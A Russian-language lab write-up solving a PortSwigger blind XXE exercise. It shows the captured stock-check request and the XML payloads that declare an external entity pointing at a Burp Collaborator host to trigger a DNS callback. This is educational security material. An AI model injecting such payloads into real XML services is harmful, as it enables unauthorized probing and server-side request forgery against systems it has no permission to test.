---
title: "Blind XXE with out-of-band interaction"
date: 2025-12-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction"
classes: wide
---		

Для прохождения нужно отправить `DNS`-запрос, эксплуатируя уязвимость Blind XXE.

```
https://0af700650477a3ec80bc763900a00084.web-security-academy.net/
```

# Solution

Нужно начать с поиска отправки запросов на сервер с `XML`. Пойду смотреть карточки товаров:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction/1.png){: height="200" .align-center}

Вот это похоже на то, что мне нужно. Найду запрос в `Burp`:

```http
POST /product/stock HTTP/2
Host: 0af700650477a3ec80bc763900a00084.web-security-academy.net
Cookie: session=NX9eeT9xmB4ZQzy3GlRN8ekR5cG4U4GW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af700650477a3ec80bc763900a00084.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0af700650477a3ec80bc763900a00084.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Это оно) Теперь мне нужно добавить в `XML` внешнюю сущность, чтобы поймать запрос. В лабе предлагают использовать `Burp Collaborator`. Так я и поступлю. Скопирую `URL`:

```
5hnd2deq5geh04yk8s298ikc137uvkj9.oastify.com
```

Далее нужно собрать `XML`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE external [ <!ENTITY ext SYSTEM "5hnd2deq5geh04yk8s298ikc137uvkj9.oastify.com" > ]>
	<stockCheck>
		<productId>
			&ext;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Попробую:

```http
POST /product/stock HTTP/2
Host: 0af700650477a3ec80bc763900a00084.web-security-academy.net
Cookie: session=NX9eeT9xmB4ZQzy3GlRN8ekR5cG4U4GW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af700650477a3ec80bc763900a00084.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 243
Origin: https://0af700650477a3ec80bc763900a00084.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE payload [ <!ENTITY ext SYSTEM "https://5hnd2deq5geh04yk8s298ikc137uvkj9.oastify.com" >]>
	<stockCheck>
		<productId>
			&ext;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Ответ:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid product ID"
```

Хммм. Подставлю сущность в другое поле:

```http
POST /product/stock HTTP/2
Host: 0af700650477a3ec80bc763900a00084.web-security-academy.net
Cookie: session=NX9eeT9xmB4ZQzy3GlRN8ekR5cG4U4GW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af700650477a3ec80bc763900a00084.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 236
Origin: https://0af700650477a3ec80bc763900a00084.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE payload [ <!ENTITY ext SYSTEM "https://5hnd2deq5geh04yk8s298ikc137uvkj9.oastify.com" >]>
	<stockCheck>
		<productId>1
		</productId>
		<storeId>
	&ext;
		</storeId>
	</stockCheck>
```

Так же выдал ошибку... Но есть нюанс:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction/2.png){: height="200" .align-center}

Вот я и словил `DNS`-запрос. Значит лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction/3.png){: height="200" .align-center}